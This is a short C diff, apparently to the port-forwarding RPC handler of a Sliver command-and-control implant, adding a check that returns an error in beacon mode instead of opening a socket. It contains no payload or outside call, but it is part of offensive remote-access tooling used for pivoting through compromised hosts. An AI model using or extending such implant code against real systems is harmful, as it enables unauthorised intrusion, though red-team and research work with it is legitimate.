@@ -248,6 +248,22 @@ int sliver_rpc_handle_portfwd(const sliver_envelope_t *req, sliver_buf_t *out) {
   uint64_t id;
   int rc;
 
+  /* Port forwarding relays a socket over a long-lived tunnel; a beacon cannot
+   * deliver those frames, so answer with an error instead of opening a socket. */
+  if (!sliver_rpc_has_capability(SLIVER_CAP_TUNNEL)) {
+    sliver_buf_t resp;
+    int ok;
+    sliver_buf_init(&resp);
+    if (sliver_buf_put_string(&resp, 1, "port forwarding is not available in beacon mode") !=
+        0) {
+      sliver_buf_free(&resp);
+      return -1;
+    }
+    ok = sliver_buf_put_bytes(out, 9, resp.data, resp.len);
+    sliver_buf_free(&resp);
+    return ok;
+  }
+
   host[0] = '\0';
   sliver_reader_init(&r, req->data, req->data_len);
   while ((rc = sliver_reader_next(&r, &field, &wire)) == 0) {
